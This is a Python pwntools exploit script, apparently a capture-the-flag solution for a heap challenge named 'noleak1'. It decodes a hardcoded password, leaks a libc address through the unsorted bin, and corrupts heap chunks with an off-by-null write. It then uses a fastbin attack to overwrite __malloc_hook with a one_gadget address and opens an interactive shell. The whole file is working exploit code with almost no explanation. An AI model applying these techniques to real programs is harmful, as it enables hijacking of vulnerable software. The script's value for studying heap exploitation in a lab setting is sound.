# -*- coding: UTF-8 -*-
from pwn import *

context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]

#io = remote('47.108.195.119', 20182)
# libc = ELF('./libc-2.31.so')
io = process('noleak1')
libc = ELF('/glibc/2.23/64/lib/libc.so.6')

l64 = lambda      :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))
def add(idx,size):
	sl('1')
	sla('Index?\n',str(idx))
	sla('Size?\n',str(size))
def show(idx):
	sl('2')
	sla('Index?\n',str(idx))
	
def edit(idx,content):
	sl('3')
	sla('Index?\n',str(idx))
	sa('content:\n',content)
		
def delete(idx):
	sl('4')
	sla('Index?\n',str(idx))

	
enc = [0x4E, 0x79, 0x5F, 0x5F, 0x30, 0x5F, 0x74, 0x63, 0x5F, 0x31, 
  0x48, 0x74, 0x70, 0x6E, 0x65, 0x37]
s = ''
for i in range(4):
    for j in range(4):
        s += chr(enc[4*j+i])
        print s

#sla('请输入你的队伍名称:','SN-天虞')
#sla('请输入你的id或名字:','一梦不醒')
sl('N0_py_1n_tHe_ct7')
add(0,0xf0)
add(1,0x50)
delete(0)
add(0,0xf0)
show(0)
leak = uu64(rl())
lg('leak')
libcbase = leak - 0x3c3b78
lg('libcbase')
mallochook = libcbase + libc.symbols['__malloc_hook']
lg('mallochook')
system = libcbase + libc.symbols['system']
lg('system')
add(2,0xf0)
add(3,0x68)
add(4,0x68)
add(5,0x178)
add(6,0x10)
delete(2)
delete(3)  # free to fastbin

edit(4,'a'*0x60+p64(0x100+0x70*2)) # offbynull
edit(5,'a'*0xf0+p64(0)+p64(0x81))  # fake chunk lastremainder

delete(5)  # chunk Merge up to unsorted bin

add(5,0xf0+0x70)  # malloc unsorted bin
edit(5,'a'*0xf0+p64(0)+p64(0x70)+p64(mallochook-0x23)) # modify chunk 3 fd to mallochook
# fastbin atttack
add(2,0x68) 

add(3,0x68)

one = [0x45206,0x4525a,0xef9f4,0xf0897]
edit(3,'a'*0x13+p64(libcbase + one[2]))
#dbg()
add(2,0xf0)
irt()

